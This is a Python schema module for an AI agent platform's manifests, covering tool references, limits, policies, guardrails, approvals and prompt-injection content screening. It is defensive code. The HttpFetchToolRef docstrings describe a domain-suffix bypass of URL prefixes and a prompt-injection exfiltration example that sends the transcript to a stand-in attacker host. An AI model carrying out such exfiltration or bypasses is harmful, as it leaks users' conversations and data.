"""Manifest schema — apiVersion felix/v1, kind Agent. Pydantic v2, extra=forbid."""

from __future__ import annotations

import re
from typing import Any, Literal

from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator

from felix.security.ssrf import assert_safe_outbound_url

API_VERSION = "felix/v1"
MANIFEST_KIND = "Agent"
MANIFEST_NAME_RE = re.compile(r"^[a-zA-Z0-9._-]+$")

ABSOLUTE_LIMITS = {
    "max_tool_calls": 500,
    "max_wall_clock_seconds": 3600,
    "max_peer_hops": 5,
    "recursion_limit": 50,
    "max_turns": 100,
    "max_input_tokens": 1_000_000,
    "max_output_tokens": 100_000,
    "max_cost_usd": 1_000.0,
    # A durable run's resume token, and therefore the lifetime of the caller scopes the fiber
    # records. It was the one lifetime in this file with no ceiling, which made "inherited
    # authority dies with the run" a promise the manifest author could set to ten years.
    "resume_token_ttl_seconds": 86_400,
}


# Without a bound a tenant-supplied manifest can pin a connection open for as long as it
# likes, so the ceiling is the absolute wall-clock limit — the longest a run is ever meant
# to take.
#
# Read that as a bound, not a guarantee. `max_wall_clock_seconds` is checked before dispatch
# and at the top of a turn, never during a call, and no deadline is propagated into the
# executor. A run's real ceiling is therefore its budget plus the longest single call it can
# still start. This is also the *absolute* limit rather than the manifest's own, so a
# manifest declaring a 10s budget may still declare an hour-long call. Clamping each call to
# the run's remaining budget is the change that would make this a guarantee.
MAX_INTEGRATION_TIMEOUT_S = ABSOLUTE_LIMITS["max_wall_clock_seconds"]
MAX_INTEGRATION_TIMEOUT_MS = MAX_INTEGRATION_TIMEOUT_S * 1000

# Outbound ref lists are capped because binding them is not free: compiling a manifest opens
# a live HTTP round trip per MCP server to list its tools, and every ref costs a tool slot in
# the model's context. (This cap was introduced when validating a ref also meant a blocking
# getaddrinfo inside a pydantic validator; that resolution has since moved to dial time, but
# the per-ref compile cost stands on its own.)
MAX_REFS = 64

# Ceiling on a single fetched response. The far end chooses how much it sends, so without a
# cap one call can exhaust the context window or the worker's memory. Generous rather than
# tight: `spec.artifacts` spills a large tool result to the object store and hands the model
# a preview, so the useful limit is "will not take the process down", not "will fit inline".
MAX_FETCH_BYTES = 5_000_000


def assert_valid_manifest_name(name: str) -> None:
    if not name or len(name) > 128 or not MANIFEST_NAME_RE.match(name):
        raise ValueError(f"Invalid manifest name: {name!r}")


class _Strict(BaseModel):
    model_config = ConfigDict(extra="forbid")


class Metadata(_Strict):
    name: str = Field(min_length=1, max_length=128)
    version: str = "1.0.0"
    description: str = ""
    tags: list[str] = Field(default_factory=list)

    @field_validator("name")
    @classmethod
    def _name_re(cls, v: str) -> str:
        assert_valid_manifest_name(v)
        return v


class ConfidenceEscalation(_Strict):
    enabled: bool = False
    escalate_to: str = ""
    low_confidence_markers: list[str] = Field(
        default_factory=lambda: [
            "i am not sure",
            "i don't know",
            "i cannot answer",
            "unclear",
            "uncertain",
            "no information",
        ]
    )
    min_response_chars: int = Field(default=40, ge=0)


class ModelSpec(_Strict):
    id: str | None = None
    temperature: float = 0.0
    max_tokens: int | None = None
    cache: bool = False
    thinking_budget: int | None = Field(default=None, ge=128, le=64000)
    # Discrete thinking level; when set, overrides thinking_budget via level map.
    thinking_level: Literal["off", "minimal", "low", "medium", "high", "xhigh", "max"] | None = None
    fallbacks: list[str] = Field(default_factory=list)
    confidence_escalation: ConfidenceEscalation = Field(default_factory=ConfidenceEscalation)
    # Optional USD / 1M token price overrides for usage cost attribution.
    price: dict[str, float] = Field(default_factory=dict)


class SystemPrompt(_Strict):
    inline: str = ""
    soul: bool = False
    base: str = ""
    # Object-store or workspace keys for instruction files (AGENTS.md, SYSTEM.md, …).
    # Loaded after base/inline and appended; use replace_with_system_md for SYSTEM.md semantics.
    files: list[str] = Field(default_factory=list)
    # When set, load this key as a full system-prompt replacement (SYSTEM.md).
    system_md: str | None = None
    # When set, append this key's contents after the composed prompt (APPEND_SYSTEM.md).
    append_system_md: str | None = None


class PromptTemplateSpec(_Strict):
    """Named user-message template expanded via ``$1`` / ``$@`` / ``${1:-default}``."""

    name: str = Field(min_length=1, max_length=64)
    body: str = ""
    # Object-store / workspace key; used when body is empty or as override source.
    file: str | None = None


class SkillRef(_Strict):
    name: str
    # Read by `a2a/card.py`, which surfaces it on the agent card. Not read by the skills
    # loader — a skill's own SKILL.md frontmatter supplies the description used in the
    # catalogue — so the two are deliberately separate.
    description: str | None = None
    version: str | None = None


class McpServerRef(_Strict):
    name: str
    url: str = ""
    command: str = ""
    args: list[str] = Field(default_factory=list)
    cwd: str = ""
    env: dict[str, str] = Field(default_factory=dict)
    # Literal token or ``secret:NAME`` / ``{"secret": "NAME"}`` (resolved at compile).
    auth: str = ""
    transport: Literal["http", "sse", "stdio"] = "sse"
    # Per-request timeout, defaulting to 30s. ContainerRef and SandboxRef already carry one;
    # without it a slow-but-working MCP server is unusable and the only symptom is a tool
    # result that reads like the server refused. Over stdio this bounds each read — the
    # handshake and the call each get it — rather than the exchange as a whole.
    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)

    @field_validator("auth", mode="before")
    @classmethod
    def _normalize_auth(cls, v: Any) -> str:
        from felix.secrets import normalize_secret_ref

        return normalize_secret_ref(v)

    @field_validator("env", mode="before")
    @classmethod
    def _normalize_env(cls, v: Any) -> dict[str, str]:
        from felix.secrets import normalize_secret_ref

        if not v:
            return {}
        if not isinstance(v, dict):
            raise ValueError("env must be a mapping")
        return {str(k): normalize_secret_ref(val) for k, val in v.items()}

    @field_validator("url")
    @classmethod
    def _safe_url(cls, v: str) -> str:
        if not v:
            return v
        # Syntactic only. Resolving here ran a blocking getaddrinfo inside a pydantic
        # validator, on the API event loop, for every ref on every manifest read and
        # write — and it never failed closed anyway (a dropped query is treated as
        # 'defer to the connection'). The authoritative check is at dial time, which is
        # also the only place that can catch a name that re-resolves after validation.
        assert_safe_outbound_url(v, resolve=False)
        return v

    @model_validator(mode="after")
    def _transport_fields(self) -> McpServerRef:
        if self.transport == "stdio":
            if not self.command.strip():
                raise ValueError("stdio MCP servers require command")
            return self
        if not self.url:
            raise ValueError("http/sse MCP servers require url")
        return self


class A2APeerRef(_Strict):
    name: str
    url: str
    auth: str = ""
    # A peer call runs an entire agent turn on the far side, so the 60s default is a tighter
    # ceiling on a longer operation than any other outbound integration has.
    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)

    @field_validator("auth", mode="before")
    @classmethod
    def _normalize_auth(cls, v: Any) -> str:
        from felix.secrets import normalize_secret_ref

        return normalize_secret_ref(v)

    @field_validator("url")
    @classmethod
    def _safe_url(cls, v: str) -> str:
        # Syntactic only. Resolving here ran a blocking getaddrinfo inside a pydantic
        # validator, on the API event loop, for every ref on every manifest read and
        # write — and it never failed closed anyway (a dropped query is treated as
        # 'defer to the connection'). The authoritative check is at dial time, which is
        # also the only place that can catch a name that re-resolves after validation.
        assert_safe_outbound_url(v, resolve=False)
        return v


class ContainerRef(_Strict):
    name: str = Field(min_length=1)
    description: str = ""
    gateway_url: str
    image: str = Field(min_length=1)
    container_tool_name: str = ""
    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
    auth: str = ""
    fatal: bool = False

    @field_validator("auth", mode="before")
    @classmethod
    def _normalize_auth(cls, v: Any) -> str:
        from felix.secrets import normalize_secret_ref

        return normalize_secret_ref(v)

    @field_validator("gateway_url")
    @classmethod
    def _safe_url(cls, v: str) -> str:
        # Syntactic only. Resolving here ran a blocking getaddrinfo inside a pydantic
        # validator, on the API event loop, for every ref on every manifest read and
        # write — and it never failed closed anyway (a dropped query is treated as
        # 'defer to the connection'). The authoritative check is at dial time, which is
        # also the only place that can catch a name that re-resolves after validation.
        assert_safe_outbound_url(v, resolve=False)
        return v


class QueueRef(_Strict):
    name: str = Field(min_length=1)
    description: str = ""
    queue_binding: str = Field(min_length=1)
    deadline_ms: int | None = None
    args_schema: dict[str, Any] | None = None
    fatal: bool = False


# No `args_schema` on the three refs below. `tools_from_sandboxes`, `tools_from_containers`
# and the browser binder each hardcode their argument model (`SandboxArgs`,
# `ContainerArgs`, `BrowserUrlArgs`) because the executor reads fixed keys — a
# manifest-supplied schema could only advertise arguments the executor would ignore,
# which is worse than none. `QueueRef` and `ClientToolRef` do read theirs.
class SandboxRef(_Strict):
    name: str = Field(min_length=1)
    description: str = ""
    binding: str = Field(min_length=1)
    sandbox_tool_name: str = ""
    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
    path_prefix: str = ""
    fatal: bool = False


class BrowserToolRef(_Strict):
    name: str = Field(min_length=1)
    description: str = ""
    binding: str = Field(min_length=1)
    op: Literal["content", "links", "snapshot", "screenshot", "pdf", "json"] = "content"
    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
    path_prefix: str = ""
    fatal: bool = False


class HttpFetchToolRef(_Strict):
    """Read a model-supplied URL over HTTP(S).

    The inverse of `McpServerRef`-style integrations and of `HttpExecutor`: the destination
    is chosen by the model, not the manifest, so `path_prefix` is how an author narrows it
    back down. Bounded here rather than at the tool because a manifest is the only place
    that knows what this agent should be allowed to read.
    """

    name: str = Field(min_length=1)
    description: str = ""
    # An operator-set prefix the URL must start with, e.g. "https://docs.felix.run/".
    # Empty means any address the egress guard permits.
    path_prefix: str = ""

    @field_validator("path_prefix")
    @classmethod
    def _validate_prefix(cls, v: str) -> str:
        """An absolute http(s) URL, normalised to end in '/'.

        This was the only URL-bearing field on any ref without a validator, and unlike the
        others it is a *security boundary* rather than a destination. Two failures it let
        through: `https://docs.felix.run` (no trailing slash) matched
        `https://docs.felix.run.evil.com/`, the classic domain-suffix bypass; and a prefix
        with no scheme, or the wrong case, matched nothing at all and turned the tool into
        one that refuses every call with no signal at author time.
        """
        if not v:
            return v
        from urllib.parse import urlsplit

        parts = urlsplit(v)
        if parts.scheme not in ("http", "https") or not parts.netloc:
            raise ValueError(f"path_prefix must be an absolute http(s) URL, got {v!r}")
        # Normalising here rather than at match time means the stored manifest says exactly
        # what will be enforced.
        return v if v.endswith("/") else v + "/"

    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
    # Response cap. The far end chooses the length, so this bounds both the context window
    # the result can consume and the memory one call can hold.
    max_bytes: int | None = Field(default=None, gt=0, le=MAX_FETCH_BYTES)
    # "text" renders HTML to readable text; "raw" returns the body as served.
    format: Literal["text", "raw"] = "text"
    fatal: bool = False
    # Unrestricted egress has to be typed out. See `_require_a_boundary`.
    allow_any_host: bool = False

    @model_validator(mode="after")
    def _require_a_boundary(self) -> HttpFetchToolRef:
        """A fetch tool with no `path_prefix` is a general-purpose exfiltration primitive.

        Every other outbound ref names an operator-fixed destination; this one lets the model
        choose, so the defaults decide whether a manifest that says nothing gets the whole
        public internet. It does not: an author who wants that writes `allow_any_host: true`
        and can be asked why in review. Fail-closed here costs one line in the manifests that
        genuinely need open fetching, and prevents the shape where prompt injection turns
        `fetch_docs` into `GET https://attacker/?d=<transcript>`.
        """
        if not self.path_prefix and not self.allow_any_host:
            raise ValueError(
                f"http_tools[{self.name!r}]: set a path_prefix to confine the tool, "
                "or allow_any_host: true to permit any address the egress guard allows"
            )
        return self


class ClientToolRef(_Strict):
    """Tool executed by the connected client; the server waits for a result."""

    name: str = Field(min_length=1)
    description: str = ""
    args_schema: dict[str, Any] | None = None
    timeout_seconds: float | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_S)
    fatal: bool = False


class MemoryCapture(_Strict):
    enabled: bool = False
    # Extraction runs once per completed turn, so it wants the cheap tier — that is
    # what this field is for. It defaulted to `llama-3-fast`, which routes to Ollama:
    # harmless while the field was never read, but now that extraction honours it, a
    # deployment with only an Anthropic key would have had capture fail on every turn
    # and say so only in a log.
    model: str = "claude-haiku"
    max_facts: int = Field(default=5, ge=1, le=20)
    min_chars: int = Field(default=80, ge=0)
    # A second pass that keeps only what the excerpt supports. Off by default because
    # it doubles the extraction calls; worth it where stored memory is acted on.
    verify: bool = False


class MemoryConsolidate(_Strict):
    enabled: bool = False
    # Same reasoning as MemoryCapture.model above, which this was the missed sibling of:
    # `llama-3-fast` routes to Ollama, so a deployment holding only an Anthropic key would
    # have had consolidation fail on every run and say so only in a log.
    model: str = "claude-haiku"
    after_facts: int = Field(default=50, ge=10)
    max_facts: int = Field(default=200, ge=1, le=500)


class MemoryRecall(_Strict):
    """Agent-facing recall.

    ``tools`` is the governed path: the memory tools are bound before the wrapper
    stack, so recalled text passes through content screening. The automatic fact
    prelude does not — prefer the tools when a manifest handles untrusted content.
    """

    tools: bool = False
    limit: int = Field(default=5, ge=1, le=50)


class MemorySpec(_Strict):
    # Where this agent's session state lives. The append-only event log is the
    # checkpoint: `postgres` persists it; `none` keeps nothing, so every turn starts
    # from the messages it was given. There is no in-process built-in on purpose —
    # see the comment above the registry in `session/store.py`.
    #
    # Open string, resolved against `session.store`'s checkpointer registry, so a
    # plugin can add one. It shipped as a Literal that no code read — `agentcore`,
    # `sqlite` and `do` all silently meant `postgres`, and `do` (Durable Objects)
    # names compute this stack deliberately does not run. Those three are now a
    # validation error rather than a lie.
    checkpointer: str = "postgres"
    # Only `pgvector` / `memory` / `none` are branched on (builder.py); the other
    # members are accepted but behave as `pgvector`.
    store: Literal["agentcore", "memory", "vectorize", "pgvector", "none"] = "pgvector"
    capture: MemoryCapture = Field(default_factory=MemoryCapture)
    consolidate: MemoryConsolidate = Field(default_factory=MemoryConsolidate)
    recall: MemoryRecall = Field(default_factory=MemoryRecall)


class SessionSpec(_Strict):
    strategy: str = "full_replay"
    # Token-threshold compaction. Used when strategy is "compacting"
    # or starts with "compacting:"; also applied as upgrade to summarizing when set.
    compaction_enabled: bool = True
    reserve_tokens: int = Field(default=16384, ge=0)
    keep_recent_tokens: int = Field(default=20000, ge=0)
    # Approximate context window for overflow detection (chars/4 estimate).
    context_window_tokens: int = Field(default=128000, ge=1024)
    # Steer drain: "all" (default) or "one-at-a-time".
    steering_mode: Literal["all", "one-at-a-time"] = "all"
    follow_up_mode: Literal["all", "one-at-a-time"] = "all"
    # Summarize abandoned branch on rewind/fork when a model is available.
    branch_summary: bool = True
    # After a completed assistant turn, compact if over budget then continue
    # (does not abort the stream).
    compact_after_turn: bool = False


class InboundAuth(_Strict):
    schemes: list[str] = Field(default_factory=list)
    required_scopes: list[str] = Field(default_factory=list)
    allow_anonymous: bool = False


class OutboundAuth(_Strict):
    providers: list[str] = Field(default_factory=list)


class AuthRequirement(_Strict):
    inbound: InboundAuth = Field(default_factory=InboundAuth)
    outbound: OutboundAuth = Field(default_factory=OutboundAuth)


class A2ACapability(_Strict):
    id: str
    description: str = ""
    input_schema_ref: str = ""


class A2APublishSpec(_Strict):
    # Defaults to True because that is the behaviour every deployment already has: the
    # field was never read, so every agent was advertised. Honouring it with the old
    # `False` default would 404 the agent card for every existing manifest. It is an
    # opt-*out* for agents an operator does not want discoverable.
    publish: bool = True
    capabilities: list[A2ACapability] = Field(default_factory=list)


class ObservabilitySpec(_Strict):
    trace: bool = True
    metrics: list[str] = Field(default_factory=list)


class ProceduralSpec(_Strict):
    enabled: bool = False
    top_k: int = Field(default=3, ge=1)
    embedding_model: str = "bge-base-en-v1.5"


class ReflectSpec(_Strict):
    verifier_model: str = ""
    threshold: float = Field(default=0.7, ge=0, le=1)
    max_iterations: int = Field(default=2, ge=1, le=5)
    criteria: str = ""


class AnomalySpec(_Strict):
    enabled: bool = True
    min_volume: int = Field(default=10, ge=1)
    min_rate: float = Field(default=0.2, ge=0, le=1)
    baseline_factor: float = Field(default=3.0, ge=1)


class ArtifactsSpec(_Strict):
    enabled: bool = False
    threshold_chars: int = Field(default=8000, ge=1)
    preview_chars: int = Field(default=200, ge=1)
    default_window_chars: int = Field(default=4000, ge=1)
    max_window_chars: int = Field(default=16000, ge=1)


class ToolsRetrievalSpec(_Strict):
    enabled: bool = False
    top_k: int = Field(default=20, ge=1)
    model: str = "bge-base-en-v1.5"


class PlanExecuteSpec(_Strict):
    planner_model: str = ""
    executor_model: str = ""
    max_subtasks: int = Field(default=8, ge=1, le=20)
    replan_on_failure: bool = True
    max_replans: int = Field(default=2, ge=0, le=5)
    executor_recursion_limit: int = Field(default=6, ge=1, le=20)
    planner_few_shots: int = Field(default=3, ge=0, le=10)


class ExecutionSpec(_Strict):
    mode: Literal["durable", "transient"] = "transient"
    resume_token_ttl_seconds: int | None = Field(
        default=None, gt=0, le=ABSOLUTE_LIMITS["resume_token_ttl_seconds"]
    )
    # Tool batch execution. "sequential" preserves steer-cancel mid-batch.
    # "parallel" runs local tools concurrently (falls back to sequential for
    # client/approval tools or when any tool forces sequential).
    tools: Literal["parallel", "sequential"] = "sequential"


class Policy(_Strict):
    id: str = Field(min_length=1)
    description: str = ""
    required_scopes: list[str] = Field(default_factory=list)
    tools: list[str] = Field(default_factory=list)

    @model_validator(mode="after")
    def _enforces_something(self) -> Policy:
        """A policy names tools *and* the scopes they require, or it enforces nothing.

        `required_scopes` is the only enforcement `apply_policies` has: it denies when a
        listed scope is absent from the caller's set. An empty list makes that check
        vacuously true, so `policies: [{id: finance-only, tools: [wire_transfer]}]` validated,
        compiled, wrapped the tool — `wrapped is not tool`, so it looked correct in the
        compiled stack — and then let every anonymous caller through. A control that appears
        in the manifest and in `felix validate-manifest` while enforcing nothing is worse than
        a missing one, which is why this raises rather than warns.

        The mirror case, scopes with no tools, gates nothing at all: no tool matches, so none is
        wrapped. Also inert, also rejected here — and it counts toward the `soc2` profile.
        """
        if not self.tools:
            raise ValueError(f"policy {self.id!r} names no tools, so it gates nothing")
        if not self.required_scopes:
            raise ValueError(
                f"policy {self.id!r} lists tools but no required_scopes, so it permits every "
                "caller while appearing to govern them. Name the scopes it requires, or drop it."
            )
        blank = [s for s in self.required_scopes if not s.strip()]
        if blank:
            raise ValueError(
                f"policy {self.id!r} requires a blank scope name, which no caller can hold "
                "deliberately — and which a token carrying an empty scope entry satisfies"
            )
        return self


class Limits(_Strict):
    max_tool_calls: int | None = Field(default=None, ge=1, le=ABSOLUTE_LIMITS["max_tool_calls"])
    max_wall_clock_seconds: float | None = Field(
        default=None, gt=0, le=ABSOLUTE_LIMITS["max_wall_clock_seconds"]
    )
    max_peer_hops: int | None = Field(default=None, ge=1, le=ABSOLUTE_LIMITS["max_peer_hops"])
    max_input_tokens: int | None = Field(default=None, ge=1, le=ABSOLUTE_LIMITS["max_input_tokens"])
    max_output_tokens: int | None = Field(default=None, ge=1, le=ABSOLUTE_LIMITS["max_output_tokens"])
    # Per-run spend ceiling, priced from the model catalog as tokens accumulate.
    max_cost_usd: float | None = Field(default=None, gt=0, le=ABSOLUTE_LIMITS["max_cost_usd"])
    precount: bool = False


class JudgeRule(_Strict):
    name: str = Field(min_length=1)
    criteria: str = Field(min_length=1)
    threshold: float = Field(default=0.7, ge=0, le=1)
    # Empty = heuristic only; set a model id (e.g. llama-3-fast) to call the gateway.
    model: str = ""
    target_tools: list[str] = Field(default_factory=list)
    final_response: bool = False


class Guardrails(_Strict):
    # A Literal, like `targets` beside it. As free text a typo — "PII",
    # "pii-redaction" — meant no wrapper was applied at all, while
    # guardrails_enabled() still returned True, so compile validation passed and
    # nothing warned. The model-provider list on OutboundAuth stays open by
    # contrast, because that registry is extensible.
    providers: list[Literal["pii"]] = Field(default_factory=list)
    block_on_match: bool = False
    targets: list[Literal["input", "output", "final_response"]] = Field(
        default_factory=lambda: ["input", "output"]
    )
    judges: list[JudgeRule] = Field(default_factory=list)


class ApprovalRule(_Strict):
    id: str = Field(min_length=1)
    description: str = ""
    tools: list[str] = Field(default_factory=list)
    # Bounded for the same reason as every `timeout_ms`, and more urgently: an unanswered
    # approval holds the request, an asyncio task, and a Redis connection for the whole TTL,
    # and the waiter polls once a second for the duration. Unbounded, one tenant can park
    # thousands of them permanently.
    ttl_seconds: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_S)
    one_shot: bool = False
    bind_principal: bool = False
    allow_unattended: bool = False
    # Argument names that must all be supplied for the rule to apply -- present, not
    # null, and non-empty if `str`, `list`, `dict`, `tuple` or `set`. `0` and `False`
    # count as supplied; see `builder.py:_arg_present` for why that is load-bearing.
    #
    # Not validated against the gated tool's schema, so a misspelled name yields a rule
    # that never fires and still passes `validate-manifest` and the attestation checks.
    # Empty means the rule gates every call, which is the original behaviour.
    #
    # Exists because a tool can be harmless in one shape and a privileged operation in
    # another: `remember` is ordinary capture until it carries a `topic_key`, at which
    # point it retires whatever else holds that key. Gating the whole tool would put an
    # approval in front of every memory write; gating none of it left a retirement
    # route open beside one that was gated for exactly that reason.
    when_args: list[str] = Field(default_factory=list)


class CommandRule(_Strict):
    pattern: str = Field(min_length=1, max_length=256)
    decision: Literal["allow", "deny", "require_approval"]
    reason: str | None = None


class CommandScreening(_Strict):
    enabled: bool = False
    include_defaults: bool = True
    rules: list[CommandRule] = Field(default_factory=list)
    target_tools: list[str] = Field(default_factory=list)
    # How long a `require_approval` rule waits for a human before failing closed.
    # Finite by default so a run cannot block forever on an approver who never comes.
    approval_ttl_seconds: int = Field(default=300, gt=0, le=MAX_INTEGRATION_TIMEOUT_S)


class ContentScreening(_Strict):
    enabled: bool = False
    # Empty = marker-based only; set a model id to add an LLM injection score.
    model: str = ""
    tools: list[str] = Field(default_factory=list)
    on_flag: Literal["quarantine", "block"] = "quarantine"


class GovernanceSpec(_Strict):
    """Opt-in framework mapping — compile-time requirements, not a certification."""

    frameworks: list[Literal["soc2", "eu_ai_act"]] = Field(default_factory=list)
    # EU AI Act deployer hint for human-oversight strictness.
    risk_tier: Literal["limited", "high"] = "limited"
    transparency_notice: bool = False
    forbid_plaintext_secrets: bool = False
    pin_compile: bool = False
    retention_days: int | None = Field(default=None, ge=1, le=3650)


class Spec(_Strict):
    pattern: str = "react"
    model: ModelSpec = Field(default_factory=ModelSpec)
    system_prompt: SystemPrompt = Field(default_factory=SystemPrompt)
    prompts: list[PromptTemplateSpec] = Field(default_factory=list)
    tools: list[str] = Field(default_factory=list)
    skills: list[SkillRef] = Field(default_factory=list)
    mcp: list[McpServerRef] = Field(default_factory=list, alias="mcp_servers", max_length=MAX_REFS)
    peers: list[A2APeerRef] = Field(default_factory=list, max_length=MAX_REFS)
    containers: list[ContainerRef] = Field(default_factory=list, max_length=MAX_REFS)
    queues: list[QueueRef] = Field(default_factory=list, max_length=MAX_REFS)
    sandboxes: list[SandboxRef] = Field(default_factory=list, max_length=MAX_REFS)
    browser_tools: list[BrowserToolRef] = Field(default_factory=list, max_length=MAX_REFS)
    http_tools: list[HttpFetchToolRef] = Field(default_factory=list, max_length=MAX_REFS)
    client_tools: list[ClientToolRef] = Field(default_factory=list, max_length=MAX_REFS)
    sub_agents: list[str] = Field(default_factory=list)
    aggregator_prompt: str = ""
    max_turns: int = Field(default=4, ge=1, le=ABSOLUTE_LIMITS["max_turns"])
    memory: MemorySpec = Field(default_factory=MemorySpec)
    session: SessionSpec = Field(default_factory=SessionSpec)
    auth: AuthRequirement = Field(default_factory=AuthRequirement)
    a2a: A2APublishSpec = Field(default_factory=A2APublishSpec)
    observability: ObservabilitySpec = Field(default_factory=ObservabilitySpec)
    execution: ExecutionSpec = Field(default_factory=ExecutionSpec)
    tools_retrieval: ToolsRetrievalSpec = Field(default_factory=ToolsRetrievalSpec)
    artifacts: ArtifactsSpec = Field(default_factory=ArtifactsSpec)
    reflect: ReflectSpec = Field(default_factory=ReflectSpec)
    plan_execute: PlanExecuteSpec = Field(default_factory=PlanExecuteSpec)
    procedural_memory: ProceduralSpec = Field(default_factory=ProceduralSpec)
    # Bounded like every integration list above. Matching became O(rules x tools) per
    # compile when tool targeting went glob, and `build_agent` runs per request — 8000
    # policies measured 0.24s of synchronous CPU on the event loop, which stalls every
    # other tenant in that worker. A manifest body of 1 MiB fits far more than 64.
    policies: list[Policy] = Field(default_factory=list, max_length=MAX_REFS)
    limits: Limits = Field(default_factory=Limits)
    guardrails: Guardrails = Field(default_factory=Guardrails)
    content_screening: ContentScreening = Field(default_factory=ContentScreening)
    command_screening: CommandScreening = Field(default_factory=CommandScreening)
    anomaly: AnomalySpec = Field(default_factory=AnomalySpec)
    approvals: list[ApprovalRule] = Field(default_factory=list, max_length=MAX_REFS)
    governance: GovernanceSpec = Field(default_factory=GovernanceSpec)
    recursion_limit: int | None = Field(default=None, ge=1, le=ABSOLUTE_LIMITS["recursion_limit"])
    # The one relaxation of `extra="forbid"`. A plugin that registers a pattern or
    # tool otherwise has no way to be configured from a manifest, because every
    # unknown key is a validation error. Namespace by plugin name:
    #
    #     spec:
    #       extensions:
    #         acme-billing: {plan: pro}
    #
    # Core never reads inside these values; they reach a pattern builder through
    # `PatternBuildContext["extensions"]`. Governance does not apply to them, so a
    # plugin must treat its own config as trusted operator input, not model input.
    extensions: dict[str, Any] = Field(default_factory=dict)

    model_config = ConfigDict(extra="forbid", populate_by_name=True)


class Manifest(_Strict):
    apiVersion: Literal["felix/v1"] = API_VERSION
    kind: Literal["Agent"] = MANIFEST_KIND
    metadata: Metadata
    spec: Spec = Field(default_factory=Spec)


def any_limit(limits: Limits) -> bool:
    return any(
        [
            limits.max_tool_calls is not None,
            limits.max_wall_clock_seconds is not None,
            limits.max_peer_hops is not None,
            limits.max_input_tokens is not None,
            limits.max_output_tokens is not None,
            limits.max_cost_usd is not None,
        ]
    )


def guardrails_enabled(g: Guardrails) -> bool:
    return bool(g.providers) or bool(g.judges)


def judges_enabled(g: Guardrails) -> bool:
    return bool(g.judges)


__all__ = [
    "ABSOLUTE_LIMITS",
    "API_VERSION",
    "MANIFEST_KIND",
    "MANIFEST_NAME_RE",
    "ApprovalRule",
    "ClientToolRef",
    "CommandScreening",
    "ContentScreening",
    "ExecutionSpec",
    "GovernanceSpec",
    "Guardrails",
    "Limits",
    "Manifest",
    "Metadata",
    "ModelSpec",
    "Policy",
    "PromptTemplateSpec",
    "Spec",
    "any_limit",
    "assert_valid_manifest_name",
    "guardrails_enabled",
    "judges_enabled",
]
